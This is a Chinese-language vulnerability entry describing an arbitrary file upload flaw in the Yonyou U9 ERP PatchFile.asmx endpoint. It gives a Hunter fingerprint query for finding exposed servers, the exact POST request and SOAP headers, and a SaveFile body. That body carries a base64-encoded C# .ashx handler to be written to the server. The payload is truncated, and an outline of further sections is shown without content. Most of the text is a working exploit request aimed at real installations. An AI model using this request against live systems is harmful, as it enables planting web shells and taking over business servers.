# 用友U9patchfile存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`Hunter：`web.body="logo-u9.png"``
- **请求**：`POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1`
- **关键头**：`Content-Length: 885`　`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://tempuri.org/SaveFile"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SaveFile xmlns="http://tempuri.org/">
<binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICA…（脚本共 1096 字，完整版见原文）
```

**其他**
- 用友U9 patchfile存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U9